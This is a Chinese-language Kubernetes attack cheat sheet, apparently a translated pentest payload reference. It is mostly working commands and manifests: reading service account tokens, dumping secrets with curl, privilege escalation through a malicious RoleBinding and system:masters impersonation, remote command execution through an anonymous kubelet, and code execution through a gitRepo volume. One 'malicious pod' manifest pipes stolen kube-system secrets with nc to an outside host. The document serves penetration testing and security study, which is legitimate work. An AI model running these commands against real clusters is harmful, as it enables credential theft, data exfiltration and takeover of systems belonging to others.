# Kubernetes

> Kubernetes（常简称为 K8s）是一个开源的容器编排平台，旨在自动化容器化应用程序的部署、扩展和管理。它最初由 Google 设计，现在由云原生计算基金会 (Cloud Native Computing Foundation) 维护。

## 目录 (Summary)

- [工具 (Tools)](#tools)
- [容器环境 (Container Environment)](#container-environment)
- [信息收集 (Information Gathering)](#information-gathering)
- [RBAC 配置 (RBAC Configuration)](#rbac-configuration)
    - [列出密钥 (Secrets)](#listing-secrets)
    - [访问任意资源或执行任意动词](#access-any-resource-or-verb)
    - [Pod 创建](#pod-creation)
    - [使用 Pods/Exec 的权限](#privilege-to-use-podsexec)
    - [获取/打补丁角色绑定 (Rolebindings) 的权限](#privilege-to-getpatch-rolebindings)
    - [模拟特权账号 (Impersonating a Privileged Account)](#impersonating-a-privileged-account)
- [特权服务账号令牌 (Privileged Service Account Token)](#privileged-service-account-token)
- [Kubernetes 端点 (Endpoints)](#kubernetes-endpoints)
- [漏洞利用 (Exploits)](#exploits)
    - [10250/TCP 端口上可访问的 Kubelet](#accessible-kubelet-on-10250tcp)
    - [获取服务账号令牌 (Service Account Token)](#obtaining-service-account-token)
- [参考资料 (References)](#references)

## 工具 (Tools)

- [BishopFox/badpods](https://github.com/BishopFox/badpods) - 一组清单文件 (manifests)，用于创建具有提权权限的 Pod。

    ```ps1
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
    ```

- [serain/kubelet-anon-rce](https://github.com/serain/kubelet-anon-rce) - 在允许匿名身份验证的 Kubelet 端点上远程执行容器中的命令。
- [DataDog/KubeHound](https://github.com/DataDog/KubeHound) - Kubernetes 攻击图谱 (Attack Graph)。

    ```ps1
    # 关键路径枚举
    kh.containers().criticalPaths().count()
    kh.containers().dedup().by("name").criticalPaths().count()
    kh.endpoints(EndpointExposure.ClusterIP).criticalPaths().count()
    kh.endpoints(EndpointExposure.NodeIP).criticalPaths().count()
    kh.endpoints(EndpointExposure.External).criticalPaths().count()
    kh.services().criticalPaths().count()

    # DNS 服务和端口
    kh.endpoints(EndpointExposure.External).criticalPaths().limit(local,1)
    .dedup().valueMap("serviceDns","port")
    .group().by("serviceDns").by("port")
    ```

- [Shopify/kubeaudit](https://github.com/Shopify/kubeaudit) - 审计 Kubernetes 集群的常见安全性问题。
- [aquasecurity/kube-bench](https://github.com/aquasecurity/kube-bench) - 通过运行 [CIS Kubernetes 基准测试](https://www.cisecurity.org/benchmark/kubernetes/) 来检查 Kubernetes 部署是否安全。
- [aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter) - 寻找 Kubernetes 集群中的安全性薄弱环节。
- [armosec/kubescape](https://github.com/armosec/kubescape) - 自动化扫描 Kubernetes 集群以识别安全性问题。
- [kubesec.io](https://kubesec.io/) - Kubernetes 资源的安全性风险分析。
- [katacoda.com](https://katacoda.com/courses/kubernetes) - 通过基于浏览器的交互式场景学习 Kubernetes。

## 容器环境 (Container Environment)

Kubernetes 集群中的容器通过[容器环境 (container environment)](https://kubernetes.io/docs/concepts/containers/container-environment/) 自动获取某些信息。虽然也可以通过卷 (volumes)、环境变量或 Downward API 提供额外信息，但本节仅涵盖默认提供的信息。

### 服务账号 (Service Account)

每个 Kubernetes Pod 都会被分配一个服务账号 (service account) 用于访问 Kubernetes API。该服务账号以及当前的命名空间 (namespace) 和 Kubernetes SSL 证书都可通过挂载的只读卷获取：

```ps1
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

如果容器内安装了 `kubectl` 工具，它会自动使用该服务账号，从而使平级集群交互变得更加容易。如果没有，则可以直接使用 `token` 和 `namespace` 文件的内容发起 HTTP API 请求。

### 环境变量 (Environment Variables)

容器会自动获得 `KUBERNETES_SERVICE_HOST` 和 `KUBERNETES_SERVICE_PORT` 环境变量。它们包含 Kubernetes 主节点 (master node) 的 IP 地址和端口号。如果安装了 `kubectl`，它会自动使用这些值。如果没有，则可以使用这些值来确定发送 API 请求的正确 IP 地址。

```ps1
KUBERNETES_SERVICE_HOST=192.168.154.228
KUBERNETES_SERVICE_PORT=443
```

此外，当容器创建时，还会为当前命名空间中运行的每个 Kubernetes 服务自动创建[环境变量](https://kubernetes.io/docs/concepts/services-networking/service/#discovering-services)。环境变量的命名遵循两种模式：

- 简化模式：`{SVCNAME}_SERVICE_HOST` 和 `{SVCNAME}_SERVICE_PORT` 包含服务的 IP 地址和默认端口号。
- [Docker 链接](https://docs.docker.com/network/links/#environment-variables)模式：针对服务暴露的每个端口，变量名模式为 `{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}`。

例如，如果运行着一个暴露了 6379 端口的 `redis-master` 服务，则以下所有环境变量都可用：

```ps1
REDIS_MASTER_SERVICE_HOST=10.0.0.11
REDIS_MASTER_SERVICE_PORT=6379
REDIS_MASTER_PORT=tcp://10.0.0.11:6379
REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379
REDIS_MASTER_PORT_6379_TCP_PROTO=tcp
REDIS_MASTER_PORT_6379_TCP_PORT=6379
REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11
```

### 模拟 `kubectl` API 请求

Kubernetes 集群内的大多数容器都不会安装 `kubectl` 工具。如果在容器内运行[单行 `kubectl` 安装命令](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)不可行，你可能需要手动构建 Kubernetes HTTP API 请求。这可以通过在*本地*使用 `kubectl` 确定从容器发送的正确 API 请求来实现。

1. 使用 `kubectl -v9 ...` 以最高详细级别运行所需命令。
1. 输出将包括 HTTP API 端点 URL、请求体以及示例 curl 命令。
1. 将端点 URL 的主机名和端口替换为容器环境变量中的 `KUBERNETES_SERVICE_HOST` 和 `KUBERNETES_SERVICE_PORT` 值。
1. 将掩码处理后的 "Authorization: Bearer" 令牌值替换为容器中 `/var/run/secrets/kubernetes.io/serviceaccount/token` 的内容。
1. 如果请求含有请求体，请确保包含 "Content-Type: application/json" 请求头，并使用常用方法（对于 curl 使用 `--data` 标志）发送请求体。

例如，此输出被用于创建[服务账号权限 (Service Account Permissions)](#service-account-permissions) 请求：

```powershell
# 注意：仅需要 Authorization 和 Content-Type 请求头，其余部分可以省略。
$ kubectl -v9 auth can-i --list
I1028 18:58:38.192352   76118 loader.go:359] Config loaded from file /home/example/.kube/config
I1028 18:58:38.193847   76118 request.go:942] Request Body: {"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","metadata":{"creationTimestamp":null},"spec":{"namespace":"default"},"status":{"resourceRules":null,"nonResourceRules":null,"incomplete":false}}
I1028 18:58:38.193912   76118 round_trippers.go:419] curl -k -v -XPOST  -H "Accept: application/json, */*" -H "Content-Type: application/json" -H "User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1" 'https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews'
I1028 18:58:38.295722   76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 201 Created in 101 milliseconds
I1028 18:58:38.295760   76118 round_trippers.go:444] Response Headers:
...
```

## 信息收集 (Information Gathering)

### 服务账号权限 (Service Account Permissions)

默认服务账号可能已被授予额外权限，从而使集群攻陷或横向移动更加容易。
以下内容可用于确定服务账号的权限：

```powershell
# 使用 kubectl 查看命名空间级别的权限
kubectl auth can-i --list

# 使用 kubectl 查看集群级别的权限
kubectl auth can-i --list --namespace=kube-system

# 使用 curl 查看权限列表
NAMESPACE=$(cat "/var/run/secrets/kubernetes.io/serviceaccount/namespace")
# 对于集群级别，改用 NAMESPACE="kube-system"

MASTER_URL="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat "/var/run/secrets/kubernetes.io/serviceaccount/token")
curl "${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  --cacert "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  --header "Authorization: Bearer ${TOKEN}" \
  --header "Content-Type: application/json" \
  --data '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'${NAMESPACE}'"}}'
```

### 密钥 (Secrets)、配置映射 (ConfigMaps) 与卷 (Volumes)

Kubernetes 提供密钥 (Secrets) 和配置映射 (ConfigMaps) 作为在运行时向容器加载配置的一种方式。虽然它们可能不会直接导致整个集群被攻陷，但其中包含的信息可能会导致单个服务被攻陷，或在集群内实现横向移动。

从容器的角度来看，Kubernetes Secrets 和 ConfigMaps 是完全相同的。两者都可以加载到环境变量中或挂载为卷。由于无法确定环境变量是否是从 Secret/ConfigMap 加载的，因此需要手动检查每个环境变量。当作为卷挂载时，Secrets/ConfigMaps 始终挂载为只读的 tmpfs 文件系统。你可以通过执行 `grep -F "tmpfs ro" /etc/mtab` 快速找到这些挂载点。

真正的 Kubernetes 卷 (Volumes) 通常用于共享存储或跨重启的持久化存储。这些卷通常挂载为 ext4 文件系统，可以通过 `grep -wF "ext4" /etc/mtab` 进行识别。

### 特权容器 (Privileged Containers)

Kubernetes 为容器和 Pod 执行支持广泛的[安全上下文 (security contexts)](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)。其中最重要的是“特权 (privileged)”[安全策略 (security policy)](https://kubernetes.io/docs/concepts/policy/pod-security-policy/)，它使得宿主节点的设备在容器的 `/dev` 目录下可用。这意味着除了可以访问宿主机的根磁盘（可用于彻底逃逸容器）外，还可以访问宿主机的 Docker 套接字文件（允许执行任意容器操作）。

虽然官方没有从容器*内部*检查特权模式的方法，但通常检查 `/dev/kmsg` 是否存在就足够了。

## RBAC 配置 (RBAC Configuration)

### 列出密钥 (Secrets)

获得集群内列出密钥权限的攻击者可以使用以下 curl 命令获取 "kube-system" 命名空间中的所有密钥。

```powershell
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
curl -k -v -H "Authorization: Bearer <jwt_token>" -H "Content-Type: application/json" https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r '.items[].data'
```

### 访问任意资源或执行任意动词

```powershell
resources:
- '*'
verbs:
- '*'
```

### Pod 创建

使用 `kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml` 检查你的权利。
然后创建一个恶意的 pod.yaml 文件。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
    - name: alpine
      image: alpine
      command: ["/bin/sh"]
      args:
        [
          "-c",
          'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
        ]
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

然后执行 `kubectl apply -f malicious-pod.yaml`。

### 使用 Pods/Exec 的权限

```powershell
kubectl exec -it <POD 名称> -n <POD 命名空间> –- sh
```

### 获取/打补丁角色绑定 (Rolebindings) 的权限

此 JSON 文件的目的是将 admin "ClusterRole" 绑定到受攻击的服务账号。
创建一个恶意的 RoleBinding.json 文件。

```powershell
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespaces": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "sa-comp"
            "namespace": "default"
        }
    ]
}
```

```powershell
curl -k -v -X POST -H "Authorization: Bearer <JWT 令牌>" -H "Content-Type: application/json" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json
curl -k -v -X POST -H "Authorization: Bearer <被窃取的 JWT 令牌>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

### 模拟特权账号 (Impersonating a Privileged Account)

```powershell
curl -k -v -XGET -H "Authorization: Bearer <模拟者的 JWT 令牌>" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

## 特权服务账号令牌 (Privileged Service Account Token)

```powershell
cat /run/secrets/kubernetes.io/serviceaccount/token
curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
```

## Kubernetes 端点 (Endpoints)

```powershell
# 列出 Pod
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/pods/

# 列出密钥 (Secrets)
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/

# 列出部署 (Deployments)
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments

# 列出 DaemonSets
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets
```

### cAdvisor

```powershell
curl -k https://<IP 地址>:4194
```

### 不安全的 API 服务器

```powershell
curl -k https://<IP 地址>:8080
```

### 安全的 API 服务器

```powershell
curl -k https://<IP 地址>:(8|6)443/swaggerapi
curl -k https://<IP 地址>:(8|6)443/healthz
curl -k https://<IP 地址>:(8|6)443/api/v1
```

### etcd API

```powershell
curl -k https://<IP 地址>:2379
curl -k https://<IP 地址>:2379/version
etcdctl --endpoints=http://<主节点-IP>:2379 get / --prefix --keys-only
```

### Kubelet API

```powershell
curl -k https://<IP 地址>:10250
curl -k https://<IP 地址>:10250/metrics
curl -k https://<IP 地址>:10250/pods
```

### Kubelet (只读)

```powershell
curl -k https://<IP 地址>:10255
http://<外部-IP>:10255/pods
```

## 漏洞利用 (Exploits)

### 10250/TCP 端口上可访问的 Kubelet

**要求 (Requirements)**：

- `--anonymous-auth`：允许匿名请求访问 Kubelet 服务器。

**利用过程 (Exploit)**：

- 获取 Pod：`curl -ks https://worker:10250/pods`
- 运行命令：`curl -Gks https://worker:10250/exec/{命名空间}/{Pod名}/{容器名} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'`

### 获取服务账号令牌 (Obtaining Service Account Token)

令牌存储于 `/var/run/secrets/kubernetes.io/serviceaccount/token`。

使用服务账号令牌：

- 在 `kube-apiserver` API 上：`curl -ks -H "Authorization: Bearer <令牌>" https://master:6443/api/v1/namespaces/{命名空间}/secrets`
- 配合 kubectl 使用：`kubectl --insecure-skip-tls-verify=true --server="https://master:6443" --token="<令牌>" get secrets --all-namespaces -o json`

### 创建 gitRepo 卷以执行代码

**要求 (Requirements)**：

- 已启用 [`gitRepo`](https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo) 卷类型。
- 在 Pod 上具有 `create` 权限。

**利用过程 (Exploit)**：

```yml
apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
  - image: alpine:latest
    command: ["sleep","86400"]
    name: test-container
    volumeMounts:
    - mountPath: /gitrepo
      name: gitvolume
  volumes:
  - name: gitvolume
    gitRepo:
      directory: g/.git
      repository: https://github.com/raesene/repopodexploit.git
      revision: main
```

## 参考资料 (References)

- [Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019](https://labs.withsecure.com/publications/attacking-kubernetes-through-kubelet)
- [kubehound - Attack Reference](https://kubehound.io/reference/attacks/)
- [KubeHound: Identifying attack paths in Kubernetes clusters - Datadog - October 2, 2023](https://securitylabs.datadoghq.com/articles/kubehound-identify-kubernetes-attack-paths/)
- [Fun With GitRepo Volumes - Rory McCune - JULY 10TH, 2024](https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/)
- [Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2)
- [Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)
- [Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
- [Kubernetes Pod Privilege Escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation)
